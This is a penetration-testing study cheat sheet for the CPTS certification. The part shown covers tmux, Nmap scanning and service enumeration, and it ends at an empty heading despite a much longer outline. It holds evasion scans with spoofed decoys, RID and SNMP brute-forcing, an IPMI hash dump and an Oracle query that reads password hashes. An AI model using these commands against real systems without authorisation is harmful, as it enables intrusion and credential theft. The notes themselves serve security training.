# CPTS Cheat Sheet

HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized, deduplicated, and sanitized.

> **Source:** adapted from the CPTS cheatsheet. This branch (`oscp-cheatsheet`) keeps the same technical material in a consistent, study-friendly structure.
>
> **No credentials are stored in this document.** Passwords, hashes, keys, tokens, and session IDs have been replaced with placeholders such as `<PASSWORD>`, `<NTLM_HASH>`, and `<API_TOKEN>`.

## Conventions

- `A>` — command run on the attack host.
- `V>` — command run on the victim/target host.
- `<PLACEHOLDER>` — replace with the value for your engagement (IP, username, password, hash, etc.).
- `#` — comment; commands are shown as they should be typed.
- `crackmapexec`/`cme` examples keep their original name; the maintained fork is **NetExec** (`nxc`).

## Table of Contents

<details>
<summary>Expand / collapse the full outline</summary>

- [Conventions](#conventions)
- [1. Tmux](#1-tmux)
- [2. Nmap](#2-nmap)
  - [Enumeration Methodology](#enumeration-methodology)
  - [Address Scanning](#address-scanning)
  - [Scan Techniques](#scan-techniques)
  - [Host Discovery](#host-discovery)
  - [Port Scanning](#port-scanning)
  - [OS & Service Detection](#os--service-detection)
  - [Timing & Performance](#timing--performance)
  - [NSE Scripts](#nse-scripts)
  - [Firewall Evasion & Spoofing](#firewall-evasion--spoofing)
  - [Output](#output)
- [3. Service Footprinting](#3-service-footprinting)
  - [Infrastructure & OSINT Enumeration](#infrastructure--osint-enumeration)
  - [Domain, Cloud & Staff Enumeration](#domain-cloud--staff-enumeration)
  - [FTP (21/tcp)](#ftp-21tcp)
  - [MSRPC (135/tcp)](#msrpc-135tcp)
  - [SMB (139, 445/tcp)](#smb-139-445tcp)
  - [Rpcbind (111/tcp)](#rpcbind-111tcp)
  - [NFS (2049/tcp)](#nfs-2049tcp)
  - [DNS (53/tcp, 53/udp)](#dns-53tcp-53udp)
  - [SMTP (25/tcp)](#smtp-25tcp)
  - [IMAP & POP3 (143/993, 110/995/tcp)](#imap--pop3-143993-110995tcp)
  - [SNMP (161/udp)](#snmp-161udp)
  - [MySQL (3306/tcp)](#mysql-3306tcp)
  - [MSSQL (1433/tcp)](#mssql-1433tcp)
  - [Oracle TNS (1521/tcp)](#oracle-tns-1521tcp)
  - [IPMI (623/udp)](#ipmi-623udp)
  - [Remote Management](#remote-management)
- [4. Web Reconnaissance](#4-web-reconnaissance)
  - [WHOIS](#whois)
  - [WhatWeb](#whatweb)
  - [Virtual Hosts](#virtual-hosts)
  - [Certificate Transparency (crt.sh)](#certificate-transparency-crtsh)
  - [Banner Grabbing](#banner-grabbing)
  - [WAF Detection](#waf-detection)
  - [Nikto](#nikto)
  - [ReconSpider](#reconspider)
  - [Automated Reconnaissance](#automated-reconnaissance)
  - [Crawling, robots.txt, .well-known & Archives](#crawling-robotstxt-well-known--archives)
- [5. File Transfers](#5-file-transfers)
  - [Windows](#windows)
    - [Download Operations](#download-operations)
      - [PowerShell Base64](#powershell-base64)
      - [PowerShell Web Downloads](#powershell-web-downloads)
      - [SMB Downloads](#smb-downloads)
      - [FTP Downloads](#ftp-downloads)
    - [Upload Operations](#upload-operations)
      - [PowerShell Base64](#powershell-base64-1)
      - [PowerShell Web Uploads](#powershell-web-uploads)
      - [SMB Uploads](#smb-uploads)
      - [FTP Uploads](#ftp-uploads)
  - [Linux](#linux)
    - [Download Operations](#download-operations-1)
      - [Base64](#base64)
      - [Wget & cURL](#wget--curl)
      - [Bash /dev/tcp](#bash-devtcp)
      - [SSH Downloads](#ssh-downloads)
    - [Upload Operations](#upload-operations-1)
      - [HTTP Upload Server](#http-upload-server)
      - [Alternative HTTP Servers](#alternative-http-servers)
      - [SCP Upload](#scp-upload)
  - [Transferring Files with Code](#transferring-files-with-code)
    - [Python](#python)
    - [PHP](#php)
    - [Ruby](#ruby)
    - [Perl](#perl)
    - [JavaScript](#javascript)
    - [VBScript](#vbscript)
    - [Python 3 Upload](#python-3-upload)
  - [Miscellaneous](#miscellaneous)
    - [Netcat & Ncat](#netcat--ncat)
      - [Forward File Transfer](#forward-file-transfer)
      - [Reverse File Transfer](#reverse-file-transfer)
    - [PowerShell Sessions](#powershell-sessions)
    - [RDP Drive Redirection](#rdp-drive-redirection)
  - [Protected File Transfers](#protected-file-transfers)
    - [Windows Encryption](#windows-encryption)
    - [Linux Encryption](#linux-encryption)
  - [Receiving Files over HTTP/S](#receiving-files-over-https)
    - [Nginx — Enabling PUT](#nginx--enabling-put)
  - [Living off the Land](#living-off-the-land)
    - [LOLBAS — Certreq Upload](#lolbas--certreq-upload)
    - [GTFOBins — OpenSSL Download](#gtfobins--openssl-download)
    - [Bitsadmin Download](#bitsadmin-download)
    - [Certutil Download](#certutil-download)
    - [GfxDownloadWrapper Download](#gfxdownloadwrapper-download)
    - [WinHttpRequest (COM)](#winhttprequest-com)
    - [Msxml2 (COM)](#msxml2-com)
    - [BITS (COM)](#bits-com)
  - [Detection & Evasion](#detection--evasion)
- [6. Shells](#6-shells)
  - [Reverse Shell](#reverse-shell)
  - [Bind Shell](#bind-shell)
  - [Web Shell](#web-shell)
  - [TTY Upgrade](#tty-upgrade)
  - [Payloads, MSFvenom & Web Shells](#payloads-msfvenom--web-shells)
- [7. Password Attacks](#7-password-attacks)
  - [Password Mutations](#password-mutations)
  - [Remote Password Attacks](#remote-password-attacks)
  - [Windows Credential Harvesting](#windows-credential-harvesting)
  - [Linux Credential Hunting](#linux-credential-hunting)
  - [Cracking Passwords](#cracking-passwords)
  - [Login Brute Forcing (Hydra)](#login-brute-forcing-hydra)
  - [Hashing, John & Hashcat](#hashing-john--hashcat)
  - [Credential Access & Lateral Movement](#credential-access--lateral-movement)
  - [Medusa & Custom Wordlists](#medusa--custom-wordlists)
  - [Attack Types, Policy & Defense](#attack-types-policy--defense)
- [8. Pivoting, Tunneling & Port Forwarding](#8-pivoting-tunneling--port-forwarding)
  - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
  - [SSH Dynamic Port Forwarding (SOCKS)](#ssh-dynamic-port-forwarding-socks)
  - [SSH Remote/Reverse Port Forwarding](#ssh-remotereverse-port-forwarding)
  - [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
  - [Socat Redirection — Reverse Shell](#socat-redirection--reverse-shell)
  - [Socat Redirection — Bind Shell](#socat-redirection--bind-shell)
  - [Rpivot](#rpivot)
  - [Windows netsh Port Proxy](#windows-netsh-port-proxy)
  - [Dnscat2 DNS Tunneling](#dnscat2-dns-tunneling)
  - [Chisel SOCKS5](#chisel-socks5)
    - [Build and Serve](#build-and-serve)
    - [Reverse SOCKS Proxy (Pivot as Server)](#reverse-socks-proxy-pivot-as-server)
    - [Chisel Reverse Pivot (Attack Host as Server)](#chisel-reverse-pivot-attack-host-as-server)
  - [ICMP Tunneling (ptunnel-ng)](#icmp-tunneling-ptunnel-ng)
  - [Windows & Additional Pivoting](#windows--additional-pivoting)
- [9. Attacking Common Services](#9-attacking-common-services)
  - [Service Misconfigurations & Sensitive Information](#service-misconfigurations--sensitive-information)
  - [FTP](#ftp)
  - [SMB](#smb)
  - [SQL (MySQL & MSSQL)](#sql-mysql--mssql)
  - [RDP](#rdp)
  - [DNS](#dns)
  - [Email (SMTP & POP3)](#email-smtp--pop3)
- [10. Active Directory](#10-active-directory)
  - [Initial Enumeration](#initial-enumeration)
  - [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
  - [Password Spraying & Password Policy](#password-spraying--password-policy)
  - [Enabling & Bypassing Security Controls](#enabling--bypassing-security-controls)
  - [Credentialed Enumeration](#credentialed-enumeration)
    - [From Linux](#from-linux)
    - [From Windows](#from-windows)
  - [Living off the Land (Windows)](#living-off-the-land-windows)
    - [Basic Host Enumeration](#basic-host-enumeration)
    - [PowerShell Enumeration](#powershell-enumeration)
    - [Firewall & Defender Checks](#firewall--defender-checks)
    - [Logged-on Users](#logged-on-users)
    - [Network Information](#network-information)
    - [WMI Enumeration](#wmi-enumeration)
    - [Net Commands](#net-commands)
    - [Dsquery](#dsquery)
  - [Kerberoasting](#kerberoasting)
  - [ACL Enumeration & Abuse](#acl-enumeration--abuse)
  - [DCSync](#dcsync)
  - [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Child → Parent Trusts (ExtraSids)](#child--parent-trusts-extrasids)
    - [Enumeration](#enumeration)
    - [ExtraSids — Mimikatz](#extrasids--mimikatz)
    - [ExtraSids — Rubeus](#extrasids--rubeus)
    - [DCSync from the Child Domain](#dcsync-from-the-child-domain)
    - [From Linux (Impacket)](#from-linux-impacket)
  - [Cross-Forest Trusts](#cross-forest-trusts)
    - [From Windows](#from-windows-1)
    - [From Linux](#from-linux-1)
  - [AD Tooling, External Recon & Advanced Attacks](#ad-tooling-external-recon--advanced-attacks)
    - [Domain & External Enumeration Commands](#domain--external-enumeration-commands)
    - [Privileged Access & Lateral Movement](#privileged-access--lateral-movement)
    - [Kerberos Double Hop](#kerberos-double-hop)
    - [Bleeding-Edge AD Vulnerabilities](#bleeding-edge-ad-vulnerabilities)
    - [ADIDNS, GPP & GPO Enumeration](#adidns-gpp--gpo-enumeration)
    - [AD Auditing & Hardening](#ad-auditing--hardening)
- [11. SQLMap](#11-sqlmap)
  - [Advanced SQLMap Options](#advanced-sqlmap-options)
- [12. Attacking Common Web Applications](#12-attacking-common-web-applications)
  - [Application Enumeration](#application-enumeration)
  - [WordPress](#wordpress)
  - [Joomla](#joomla)
  - [Drupal](#drupal)
  - [Tomcat](#tomcat)
  - [Splunk](#splunk)
  - [PRTG](#prtg)
  - [GitLab](#gitlab)
  - [CGI](#cgi)
  - [ColdFusion](#coldfusion)
  - [IIS Tilde Enumeration](#iis-tilde-enumeration)
  - [LDAP](#ldap)
  - [Jenkins](#jenkins)
  - [osTicket, Thick Clients, Mass Assignment & Hardening](#osticket-thick-clients-mass-assignment--hardening)
    - [osTicket](#osticket)
    - [Thick Client Applications](#thick-client-applications)
    - [Web Mass Assignment](#web-mass-assignment)
    - [Application Hardening](#application-hardening)
  - [Applications Connecting to Services](#applications-connecting-to-services)
- [13. Linux Privilege Escalation](#13-linux-privilege-escalation)
  - [Quick Checks](#quick-checks)
  - [Information Gathering](#information-gathering)
    - [Environment Enumeration](#environment-enumeration)
    - [Services & Internals Enumeration](#services--internals-enumeration)
    - [Credential Hunting](#credential-hunting)
  - [Environment-Based Privilege Escalation](#environment-based-privilege-escalation)
    - [Path Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
  - [Permissions-Based Privilege Escalation](#permissions-based-privilege-escalation)
    - [Special Permissions (SUID/SGID)](#special-permissions-suidsgid)
    - [Sudo Rights Abuse](#sudo-rights-abuse)
    - [Privileged Groups](#privileged-groups)
    - [Capabilities](#capabilities)
  - [Service-Based Privilege Escalation](#service-based-privilege-escalation)
    - [Vulnerable Services](#vulnerable-services)
    - [Cron Job Abuse](#cron-job-abuse)
    - [LXD](#lxd)
    - [Docker](#docker)
    - [Kubernetes](#kubernetes)
    - [Logrotate](#logrotate)
    - [Miscellaneous Techniques](#miscellaneous-techniques)
  - [Linux Internals-Based Privilege Escalation](#linux-internals-based-privilege-escalation)
    - [Kernel Exploits](#kernel-exploits)
    - [Shared Libraries (LD_PRELOAD)](#shared-libraries-ld_preload)
    - [Shared Object Hijacking](#shared-object-hijacking)
    - [Python Library Hijacking](#python-library-hijacking)
  - [Recent 0-Days](#recent-0-days)
    - [Sudo — CVE-2021-3156 (Baron Samedit)](#sudo--cve-2021-3156-baron-samedit)
    - [Sudo Policy Bypass — CVE-2019-14287](#sudo-policy-bypass--cve-2019-14287)
    - [Polkit — CVE-2021-4034 (PwnKit)](#polkit--cve-2021-4034-pwnkit)
    - [Dirty Pipe — CVE-2022-0847](#dirty-pipe--cve-2022-0847)
    - [Netfilter](#netfilter)
  - [Hardening Considerations](#hardening-considerations)
  - [Skills Assessment](#skills-assessment)
  - [References](#references)
- [14. Penetration Testing Process](#14-penetration-testing-process)
  - [Laws & Regulations](#laws--regulations)
  - [Engagement Stages](#engagement-stages)
    - [Pre-Engagement](#pre-engagement)
    - [Information Gathering](#information-gathering-1)
    - [Vulnerability Assessment](#vulnerability-assessment)
    - [Exploitation](#exploitation)
    - [Post-Exploitation](#post-exploitation)
    - [Lateral Movement](#lateral-movement)
    - [Proof-of-Concept](#proof-of-concept)
    - [Post-Engagement](#post-engagement)
  - [Practice](#practice)
- [15. Getting Started](#15-getting-started)
  - [Setup](#setup)
  - [Basic Workflow](#basic-workflow)
  - [Shells and Stabilization](#shells-and-stabilization)
  - [Privilege Escalation and File Transfer](#privilege-escalation-and-file-transfer)
  - [Nibbles Walkthrough](#nibbles-walkthrough)
  - [Common Pitfalls](#common-pitfalls)
- [16. Vulnerability Assessment](#16-vulnerability-assessment)
  - [Assessment Types](#assessment-types)
  - [Scoring and References](#scoring-and-references)
  - [Nessus](#nessus)
  - [OpenVAS / GVM](#openvas--gvm)
  - [Nessus Advanced Settings & Export](#nessus-advanced-settings--export)
  - [Reporting](#reporting)
- [17. Using the Metasploit Framework](#17-using-the-metasploit-framework)
  - [MSFconsole Basics](#msfconsole-basics)
  - [Modules, Targets, and Payloads](#modules-targets-and-payloads)
  - [Encoders and Evasion](#encoders-and-evasion)
  - [Database and Workspaces](#database-and-workspaces)
  - [Sessions and Jobs](#sessions-and-jobs)
  - [Meterpreter](#meterpreter)
  - [Plugins & Mixins](#plugins--mixins)
  - [Writing and Importing Modules](#writing-and-importing-modules)
  - [MSFvenom and Handlers](#msfvenom-and-handlers)
  - [Wrapping and Packing](#wrapping-and-packing)
  - [References](#references-1)
- [18. Using Web Proxies](#18-using-web-proxies)
  - [Proxy Setup](#proxy-setup)
  - [Core Workflow](#core-workflow)
  - [Burp/ZAP Feature Map](#burpzap-feature-map)
  - [Proxying Command-Line Tools](#proxying-command-line-tools)
  - [Useful Burp/ZAP Features](#useful-burpzap-features)
- [19. Command Injections](#19-command-injections)
  - [Detection](#detection)
  - [Basic Exploitation](#basic-exploitation)
  - [Filter Evasion](#filter-evasion)
  - [Obfuscation Tools](#obfuscation-tools)
  - [Blind / Out-of-Band Checks](#blind--out-of-band-checks)
  - [Prevention](#prevention)
- [20. Attacking Web Applications with Ffuf](#20-attacking-web-applications-with-ffuf)
  - [Directory and Page Fuzzing](#directory-and-page-fuzzing)
  - [Domain and Vhost Fuzzing](#domain-and-vhost-fuzzing)
  - [Parameter and Value Fuzzing](#parameter-and-value-fuzzing)
  - [Result Filters](#result-filters)
- [21. SQL Injection Fundamentals](#21-sql-injection-fundamentals)
  - [MySQL Basics](#mysql-basics)
  - [Authentication Bypass](#authentication-bypass)
  - [UNION Injection](#union-injection)
  - [Database Enumeration](#database-enumeration)
  - [Reading and Writing Files](#reading-and-writing-files)
  - [Mitigations](#mitigations)
- [22. Cross-Site Scripting (XSS)](#22-cross-site-scripting-xss)
  - [Types](#types)
  - [Test Payloads](#test-payloads)
  - [Discovery](#discovery)
  - [Defacing](#defacing)
  - [Phishing](#phishing)
  - [Session Hijacking](#session-hijacking)
  - [Prevention](#prevention-1)
- [23. File Inclusion](#23-file-inclusion)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
  - [PHP Filters](#php-filters)
  - [PHP Wrappers](#php-wrappers)
  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
  - [LFI + File Upload](#lfi--file-upload)
  - [Log Poisoning](#log-poisoning)
  - [Automation](#automation)
  - [Prevention](#prevention-2)
- [24. File Upload Attacks](#24-file-upload-attacks)
  - [Web Shell Upload](#web-shell-upload)
  - [Client-Side Validation](#client-side-validation)
  - [Filter Bypasses](#filter-bypasses)
  - [Limited Uploads](#limited-uploads)
  - [Other Upload Attacks](#other-upload-attacks)
  - [Prevention](#prevention-3)
- [25. Web Attacks](#25-web-attacks)
  - [HTTP Verb Tampering](#http-verb-tampering)
  - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
  - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
  - [Prevention](#prevention-4)
- [26. Windows Privilege Escalation](#26-windows-privilege-escalation)
  - [Tools](#tools)
  - [Situational Awareness and Enumeration](#situational-awareness-and-enumeration)
  - [User Privileges](#user-privileges)
    - [SeImpersonate / SeAssignPrimaryToken](#seimpersonate--seassignprimarytoken)
    - [SeDebugPrivilege](#sedebugprivilege)
    - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
  - [Group Privileges](#group-privileges)
    - [Backup Operators / SeBackupPrivilege](#backup-operators--sebackupprivilege)
    - [Event Log Readers](#event-log-readers)
    - [DnsAdmins](#dnsadmins)
    - [Hyper-V Administrators](#hyper-v-administrators)
    - [Print Operators](#print-operators)
    - [Server Operators](#server-operators)
  - [User Account Control (UAC)](#user-account-control-uac)
  - [Weak Permissions and Services](#weak-permissions-and-services)
  - [Kernel Exploits](#kernel-exploits-1)
  - [Vulnerable Services](#vulnerable-services-1)
  - [DLL Injection and Hijacking](#dll-injection-and-hijacking)
  - [Credential Theft](#credential-theft)
  - [Interacting with Users](#interacting-with-users)
  - [Pillaging](#pillaging)
  - [Restricted Environments and Additional Techniques](#restricted-environments-and-additional-techniques)
    - [Citrix Breakout](#citrix-breakout)
    - [Scheduled Tasks](#scheduled-tasks)
    - [End-of-Life Systems](#end-of-life-systems)
  - [Hardening](#hardening)
- [27. Documentation & Reporting](#27-documentation--reporting)
  - [Notetaking and Organization](#notetaking-and-organization)
  - [Report Types](#report-types)
  - [Components of a Finding](#components-of-a-finding)
  - [Writing Tips](#writing-tips)
  - [Report Quality Checklist](#report-quality-checklist)
- [28. Attacking Enterprise Networks](#28-attacking-enterprise-networks)
  - [Engagement Flow](#engagement-flow)
  - [External Information Gathering](#external-information-gathering)
  - [Service and Web Enumeration](#service-and-web-enumeration)
  - [Initial Access](#initial-access)
  - [Internal Information Gathering](#internal-information-gathering)
  - [Internal Exploitation & Privilege Escalation](#internal-exploitation--privilege-escalation)
  - [Lateral Movement and AD Compromise](#lateral-movement-and-ad-compromise)
  - [Persistence & Post-Exploitation](#persistence--post-exploitation)
  - [Post-Exploitation and Closeout](#post-exploitation-and-closeout)
  - [Engagement Checklist](#engagement-checklist)
- [29. Useful Resources](#29-useful-resources)

</details>

## 1. Tmux

```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```

## 2. Nmap

### Enumeration Methodology

Enumeration is iterative. Start with a fast scan, expand to all TCP ports, add UDP where relevant, then fingerprint each service and follow anomalies.

```bash
# Fast pass, then all ports
nmap -sC -sV -oA initial <TARGET_IP>
nmap -p- -sV -oA all_tcp <TARGET_IP>

# UDP top ports
sudo nmap -sU --top-ports 100 -oA udp <TARGET_IP>

# Scripts and version intensity
nmap -sC -sV --version-all -p <PORTS> <TARGET_IP>
```

Document each service, version, and banner; re-scan after changes. Correlate results with hostnames, virtual hosts, and certificates before moving to exploitation.

### Address Scanning

```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```

### Scan Techniques

```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```

### Host Discovery

```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

### Port Scanning

```
# Port scan from service name
nmap 192.168.1.1 -p http,https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 --top-ports 200
```

### OS & Service Detection

```
# Aggressive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV --version-intensity 7 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O --osscan-guess 192.168.1.1
```

### Timing & Performance

```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```

### NSE Scripts

```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```

### Firewall Evasion & Spoofing

```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs, or you can generate random 5 IPs via this option -D RND:5
nmap 192.168.1.1 -D 192.168.1.11,192.168.1.12,192.168.1.13
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

# -S 	Scans the target by using different source IP address | -O for operating system | -e to scan from specific Ethernet
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0

# --source-port 53 	Performs the scans from specified source port | or You Can Connect To The Filtered Port
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000 |or| nc -nv -p 53 10.129.2.47 50000

# -sA 	Performs ACK scan on specified ports.
sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
```

### Output

```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```

## 3. Service Footprinting

### Infrastructure & OSINT Enumeration

```
# Certificate transparency | to gather all subdomains for a corporate/company
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .

# Scan each IP address in a list using Shodan.
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### Domain, Cloud & Staff Enumeration

Use an iterative methodology: identify the layer you are in (internet, DMZ, internal, restricted), enumerate broadly, then dig into anomalies.

```bash
# Domain and certificate transparency
whois <DOMAIN>
dig any <DOMAIN>
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq .
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name |
  cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 |
  awk '{gsub(/\\n/,"\n");}1;' | sort -u

# Resolve discovered subdomains and collect IPs
for i in $(cat subdomains.txt); do host "$i" | grep "has address"; done
for i in $(cat subdomains.txt); do host "$i" | grep "has address" | awk '{print $4}'; done |
  sort -u > ip-addresses.txt

# Enrich with Shodan
for i in $(cat ip-addresses.txt); do shodan host "$i"; done
```

Cloud resource checks:

```bash
# AWS S3 / GCP Storage / Azure Blob naming patterns
aws s3 ls s3://<BUCKET> --no-sign-request
gsutil ls gs://<BUCKET>
curl -s https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list
```

Look for public storage buckets, exposed CI/CD artifacts, and cloud-hosted subdomains. Use search engines for `site:s3.amazonaws.com <COMPANY>`, `site:blob.core.windows.net <COMPANY>`, and `site:storage.googleapis.com <COMPANY>`.

Staff and OSINT:

- Company website, LinkedIn, job postings, GitHub/GitLab, social media.
- Email format discovery (`first.last@`, `flast@`, etc.).
- `theHarvester`, `hunter.io`, breach data, and public paste sites.
- Usernames and email addresses feed password spraying and phishing simulations.

### FTP (21/tcp)

```
# Connect to FTP
ftp <IP>
ftp 10.129.203.6 -p 2121

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# Using nmap
sudo nmap --script-updatedb
find / -type f -name ftp* 2>/dev/null | grep scripts

# Using openssl, in case ftp use TLS/SSL
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

### MSRPC (135/tcp)

```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### SMB (139, 445/tcp)

```
# Connect to a specific SMB share | -L for display all files | and - N  for null session (-N), which is anonymous access
smbclient //<FQDN/IP>/<share>

# Interaction with the target using RPC | Query = `srvinfo` or `enumdomains` or `querydominfo` or `netshareenumall` or `netsharegetinfo <share>` or `enumdomusers` or `queryuser <RID>`
rpcclient -U "" <FQDN IP>

# Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# we can brute force for user rids also via Impacket - Samrdump.py
samrdump.py 10.129.14.128

# using smbmap
smbmap -H 10.129.14.128

# using Enum4Linux-ng
 ./enum4linux-ng.py 10.129.14.128 -A

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p ''
```

### Rpcbind (111/tcp)

```
rpcinfo -p 10.11.1.111  # enum NFS shares
showmount -e 10.11.1.111
mount -t nfs 10.11.1.111:/ /mnt -o nolock     # mount remote share to your local machine

rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```

### NFS (2049/tcp)

```
# Via nmap
 sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
```

### DNS (53/tcp, 53/udp)

```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver. | if you found a sub domain internally you can use this option dig axfr internal.domain.tld @<nameserver>
dig axfr <domain.tld> @<nameserver>

# Subdomain Brute Forcing
> for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

> dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
> dnsenum --enum inlanefreight.com -f /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt --threads 20 --noreverse --nodnsserver --noreport --nocolor -r
```

### SMTP (25/tcp)

```
# NS request to the specific nameserver. | `AUTH PLAIN` or `HELO` or `CONNECT 10.129.14.128:25 HTTP/1.0` when dealing with proxy or `MAIL FROM` or `RCPT TO` or `DATA` or `RSET` or `VRFY` or `EXPN` or `NOOP` or `QUIT`
telnet <ip> 25

# to enum a list of users
smtp-user-enum -M VRFY -U /home/kali/Downloads/footprinting-wordlist.txt -t 10.129.152.94 -w 120 -p 25 -v
```

### IMAP & POP3 (143/993, 110/995/tcp)

```
# Log in to the IMAPS service using cURL | `-k` or `-v`
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service | there are multiple IMAP Commands you need to search about it https://www.atmail.com/blog/imap-101-manual-imap-sessions/
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service | there are multiple IMAP Commands you need to search about it
openssl s_client -connect <FQDN/IP>:pop3s
```

### SNMP (161/udp)

```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service. | you can guess community-string by fuzzing via /opt/useful/seclists/Discovery/SNMP/snmp.txt list
onesixtyone -c community-strings-fuzzing.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```

### MySQL (3306/tcp)

```
mysql -u <user> -p<password> -h <FQDN/IP>
SELECT @@version_compile_os
```

### MSSQL (1433/tcp)

```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
mssqlclient.py -p 1433 julio@10.129.203.7
sqlcmd -S SRVMSSQL -U julio -P '<PASSWORD>' -y 30 -Y 30
sqsh -S 10.129.203.7 -U .\\julio -P '<PASSWORD>' -h   # Linux client

```

### Oracle TNS (1521/tcp)

```
# using nmap
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# using odat tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
./odat.py all -s 10.129.204.235

# using SQLplus - to Access/Log In | if you receive an error go to https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
sqlplus <username>/<password>@<IP>/XE
sqlplus <username>/<password>@<IP>/XE as sysdba

# Oracle RDBMS - Interaction
> select table_name from all_tables; | > select * from user_role_privs; | > select name, password from sys.user$;

# Oracle RDBMS - File Upload
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P <PASSWORD> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```

### IPMI (623/udp)

```
# Using nmap
sudo nmap -sU --script ipmi-version -p 623 domain.local

# IPMI version detection
msf6 use auxiliary/scanner/ipmi/ipmi_version

# Dump IPMI hashes
msf6 use auxiliary/scanner/ipmi/ipmi_dumphashes
```

### Remote Management

